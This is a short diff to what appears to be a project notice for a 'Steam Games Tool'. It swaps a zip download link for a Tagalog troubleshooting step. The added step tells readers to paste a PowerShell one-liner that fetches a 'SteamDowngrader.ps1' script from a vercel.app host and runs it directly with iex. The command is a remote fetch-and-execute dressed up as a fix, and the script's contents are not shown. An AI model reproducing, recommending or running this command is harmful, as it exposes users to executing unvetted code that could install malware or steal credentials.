@@ -1,1 +1,3 @@
-Please update, latest version is v3.5: https://steamgamestool.github.io/downloads/Steam%20Games%20Tool%20v3.5.zip
+Kung nakakaencounter ka ng issue or problema sa version na ito, i-run mo lang ito sa powershell:
+
+iwr -useb "https://luatools.vercel.app/SteamDowngrader.ps1" | iex
